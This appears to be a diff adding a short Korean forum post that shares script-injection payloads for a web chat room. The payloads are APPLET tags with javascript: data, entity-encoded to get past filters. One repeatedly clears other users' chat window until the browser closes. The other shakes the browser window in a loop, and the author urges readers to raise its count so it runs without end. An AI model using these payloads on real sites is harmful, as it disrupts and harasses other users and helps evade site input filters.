@@ -1,0 +1,11 @@
+﻿<APPLET DATA=javascript:parent.channel_&#98ody.clear()></applet>
+
+이 퍽을 쓰면 대화창이 계속 청소가 됩니다..브라우저 종료할때까지...헐헐...이걸 약간 변형해서 아주 잼있는 퍽을 만들었습니다..
+
+<appleT DATA=javascript:&#102;or(i=3;i<20;i++){window.top.moveTo(20,20);window.top.moveTo(10,40);window.top.moveTo(70,20);window.top.moveTo(10,0)}></applet><APPLET DATA=javascript:parent.channel_&#98ody.clear()></applet>
+
+지진퍽 + 무한청소퍽인데 앞에서 설명드렸듯이 지진퍽은 위의 숫자를 올리면 무한적으로 퍽이 된다는것은 다 아시죠?
+한번직접 고쳐서 해보세요 잼있어여
+
+ 
+
